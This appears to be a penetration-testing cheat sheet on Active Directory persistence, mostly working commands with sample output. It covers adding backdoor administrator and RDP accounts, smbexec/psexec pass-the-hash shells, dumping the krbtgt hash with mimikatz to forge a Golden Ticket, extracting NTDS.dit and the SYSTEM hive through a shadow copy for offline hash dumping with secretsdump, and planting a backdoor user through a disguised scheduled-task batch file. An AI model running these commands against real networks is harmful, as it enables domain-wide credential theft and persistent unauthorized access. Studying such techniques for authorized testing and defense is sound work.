# Active Directory Persistence

Techniques aimed at maintaining an attacker's foothold on the target network.
Could be employed during penetration testing or red-teaming exercises whose rules of engagement mandate we retain long-term access to the compromised environment.

- <https://attack.mitre.org/tactics/TA0003/>



























## Add another root/administrator user to the system for future access so that you don't have to hack into again.

1. Inject admin group user
net user tmp PW /add
net localgroup Administrator tmp /add
Then use winrm/rdp to access if available
2. If you own the admin creds/hash

smbexec.py for administrator shell
smbexec.py DOMAIN/ADMIN_USERNAME:ADMIN_PASSWORD@TARGET_IP
smbexec.py DOMAIN/ADMIN_USERNAME@TARGET_IP -hashes NTHASH:NTHASH

psexec.py for system shell
psexec.py DOMAIN/ADMIN_USERNAME:ADMIN_PASSWORD@TARGET_IP
psexec.py DOMAIN/ADMIN_USERNAME@TARGET_IP -hashes NTHASH:NTHASH


net user hacker hacker123 /add
net localgroup Administrators hacker /add
net localgroup "Remote Desktop Users" hacker /ADD














































## Golden Ticket
If we can get our hands on the krbtgt password hash, we could create our own self-made custom TGTs, also known as golden tickets.

Although this technique's name resembles the Silver Ticket, Golden Tickets provide a more powerful attack vector.

While Silver Tickets aim to forge a TGS ticket to access a specific service, Golden Tickets give us permission to access the entire domain's resources.


The best advantage is that the krbtgt account password is not automatically changed. This password is only changed when the DOMAIN FUNCTIONAL LEVEL is upgraded from a pre-2008 Windows server, but not from a newer version. Because of this, it is not uncommon to find very old krbtgt password hashes.
(The Domain Functional Level dictates the capabilities of the domain and determines which Windows operating systems can be run on the domain controller. Higher functional levels enable additional features, functionality, and security mitigations. See: <https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels>)




Example:

1.
To test this persistence technique, we will first attempt to laterally move from the Windows 11 `CLIENT74` workstation to the domain controller via `PsExec` as the `jen` user by spawning a traditional command shell with the cmd command. This should fail because we do not have the proper permissions.
```
PsExec64.exe \\DC1 cmd.exe
# Output: Access is denied.
```


2.
Requisite: have access to a Domain Admin's group account or to have compromised the domain controller itself.

To simulate this, we'll log in to the domain controller with remote desktop using the jeffadmin account. Then we will run:
```
privilege::debug
lsadump::lsa /patch

# Output:
Domain : CORP / S-1-5-21-1987370270-658905905-1781884369

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : 2892d26cdf84d7a70e2eb3b9f05c425e

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : 1693c6cefafffc7af11ef34d1c788f47
...
```

We obtained the NTLM hash of the krbtgt account, along with the domain SID, we can now forge and inject our golden ticket.


Now on the normal user account (jen):

Before we generate the golden ticket let's launch mimikatz and delete any existing Kerberos tickets
```
kerberos::purge
```

Then create the golden ticket:
```
kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
```

With the golden ticket injected into memory, let's use `PsExec` to launch a new command prompt with `misc::cmd`.

```
misc::cmd

C:\Tools\SysinternalsSuite>PsExec.exe \\dc1 cmd.exe
C:\Tools\SysinternalsSuite>whoami
# Output: corp\jen
C:\Tools\SysinternalsSuite>whoami /groups
...
CORP\Domain Admins
...
```
We verified that our user jen is now part of the Domain Admin group.

Note that by creating our own TGT and then using PsExec, we are performing the overpass the hash attack by leveraging Kerberos authentication.

If we were to connect `PsExec` to the IP address of the domain controller instead of the hostname, we would instead force the use of NTLM authentication and access would still be blocked.





































## Shadow Copies

A Shadow Copy, also known as Volume Shadow Service (VSS) is a Microsoft backup technology that allows the creation of snapshots of files or entire volumes.

- <https://en.wikipedia.org/wiki/Shadow_Copy>


To manage volume shadow copies, the Microsoft signed binary `vshadow.exe` is offered as part of the Windows SDK.

As domain admins, we can abuse the vshadow utility to create a Shadow Copy that will allow us to extract the Active Directory Database `NTDS.dit` database file. Once we've obtained a copy of the database, we need the SYSTEM hive, and then we can extract every user credential offline on our local Kali machine.



Connected as domain admin user to the DC1 domain controller, launch an elevated command prompt and run the vshadow utility with `-nw` options to disable writers, which speeds up backup creation and include the `-p` option to store the copy on disk.

```
vshadow.exe -nw -p  C:

# Output:
...
- Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
...
```

Once the snapshot has been taken successfully, we should take note of the shadow copy device name.
Then copy the whole AD Database from the shadow copy to the `C:` drive root folder by specifying the shadow copy device name and adding the full `ntds.dit` path.
```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
```

Finally, to correctly extract the content of ntds.dit, we need to save the SYSTEM hive from the Windows registry. We can accomplish this with the `reg` utility and the `save` argument.
```
reg.exe save hklm\system c:\system.bak
```


Once the two `.bak` files are moved to our Kali machine, we can continue extracting the credential materials with the `secretsdump` tool from the `impacket` suite. We'll supply the ntds database with the `-ntds` parameter and the system hive with the `-system` parameter. Then we will tell impact to parse the files locally by adding the LOCAL keyword.

```
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL

# Output:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC1$:1000:aad3b435b51404eeaad3b435b51404ee:eda4af1186051537c77fa4f53ce2fe1a:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1693c6cefafffc7af11ef34d1c788f47:::
dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
...
```

We managed to obtain NTLM hashes and Kerberos keys for every AD user. We can now try to crack them or use as-is in pass-the-hash attacks!


NOTE: while these methods might work fine, they leave an access trail and may require us to upload tools.

An alternative is to abuse AD functionality itself to capture hashes remotely from a workstation. To do this, we could move laterally to the domain controller and run Mimikatz to dump the password hash of every user, using the DC sync method. This is a less conspicuous persistence technique that we can misuse.































## Using Scheduled Tasks

Example: the goal of the attacker is to create a user named “User123” and add it to a relevant group for it to be able to run an RDP. The attacker chose not to do this manually by hand, but with a scheduled task.

Scheduled Task name: "update-daily"
File: C:\Users\[VICTIM]\Documents\important.bat
```
@echo off
net user /add User123 pass
net localgroup "Remote Desktop Users" User123 /add
```